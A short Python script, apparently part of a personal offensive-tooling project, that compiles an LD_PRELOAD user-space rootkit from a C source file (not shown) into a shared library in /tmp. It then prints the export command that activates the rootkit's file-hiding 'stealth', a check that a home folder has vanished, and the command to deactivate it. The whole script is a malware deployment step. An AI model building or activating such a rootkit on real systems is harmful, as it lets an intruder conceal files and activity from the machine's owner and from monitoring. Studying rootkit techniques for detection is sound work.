#!/usr/bin/env python3
import os
import subprocess
import sys

def deploy():
    print("[*] Agent 155: Compiling User-Space Rootkit...")
    
    source_path = "/home/dan/Chimera_Project/agents/155_LD_Preload_Rootkit/src/rootkit.c"
    output_path = "/tmp/libchimera.so"
    
    # -fPIC: Position Independent Code (required for shared libraries)
    # -shared: Create a shared object
    # -ldl: Link against the dynamic linking library
    compile_cmd = f"gcc -fPIC -shared -o {output_path} {source_path} -ldl"
    
    try:
        subprocess.run(compile_cmd, shell=True, check=True)
        print(f"[+] Rootkit successfully compiled to: {output_path}")
        
        print("\n" + "="*50)
        print("COMMAND TO ACTIVATE STEALTH:")
        print(f"export LD_PRELOAD={output_path}")
        print("="*50)
        print("[*] Verify: Run 'ls /home/dan/' and look for the Chimera folder.")
        print("[*] Deactivate: Type 'unset LD_PRELOAD' to return to normal.")
        
    except subprocess.CalledProcessError:
        print("[!] Error: Compilation failed. Ensure 'gcc' is installed.")

if __name__ == "__main__":
    deploy()
